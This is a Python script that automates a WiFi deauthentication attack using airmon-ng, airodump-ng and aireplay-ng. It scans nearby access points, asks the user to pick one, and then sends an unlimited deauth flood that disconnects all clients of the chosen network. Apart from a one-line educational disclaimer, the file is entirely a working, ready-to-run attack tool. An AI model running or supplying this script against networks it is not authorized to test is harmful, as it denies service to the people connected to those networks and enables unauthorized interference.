#!/usr/bin/env python3
# Disclaimer: This script is for educational purposes only.  Do not use against any network that you don't own or have authorization to test.

import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

active_wireless_networks = []

def check_for_essid(essid, lst):
    if not lst:
        return True
    for item in lst:
        if essid in item["ESSID"]:
            return False
    return True
# Basic user interface header
print(r""" 
 _____    _________.______________ ._____________  _____   
  /  _  \  /   _____/|   \_   _____/ |   \____    / /  _  \  
 /  /_\  \ \_____  \ |   ||   __)    |   | /     / /  /_\  \ 
/    |    \/        \|   ||   \      |   |/     /_/    |    \
\____|__  /_______  /|___|\___/      |___/_______ \____|__  /
    
        \/        \/          \/                 \/       \/ """)
print("\n****************************************************************")
print("\n* Mohammad Asif                             *")
print("\n* https://github.com/asifiza                                  *")
print("\n* https://www.linkedin.com/in/asifiza/                          *")
print("\n****************************************************************")
if 'SUDO_UID' not in os.environ.keys():
    print("Try running this program with sudo.")
    exit()

for file_name in os.listdir():
    if ".csv" in file_name:
        print("There shouldn't be any.csv files in your directory. We found.csv files in your directory.")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("Backup folder exists.")
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

wlan_pattern = re.compile("^wlan[0-9]+")
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

if not check_wifi_result:
    print("Please connect a WiFi controller and try again.")
    exit()

print("The following WiFi interfaces are available:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

while True:
    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Please enter a number that corresponds with the choices.")

hacknic = check_wifi_result[int(wifi_interface_choice)]

print("WiFi adapter connected!\nNow let's kill conflicting processes:")
subprocess.run(["sudo", "airmon-ng", "check", "kill"])

print("Putting Wifi adapter into monitored mode:")
subprocess.run(["sudo", "airmon-ng", "start", hacknic])

discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w","file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            if ".csv" in file_name:
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                with open(file_name) as csv_h:
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for row in csv_reader:
                        if row["BSSID"] == "BSSID":
                            pass
                        elif row["BSSID"] == "Station MAC":
                            break
                        elif check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)

        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make choice.")

while True:
    choice = input("Please select a choice from above: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Please try again.")

hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        print("Deauthenticating clients, press ctrl-c to stop")
except KeyboardInterrupt:
    print("Stop monitoring mode")
    subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
    print("Thank you! Exiting now")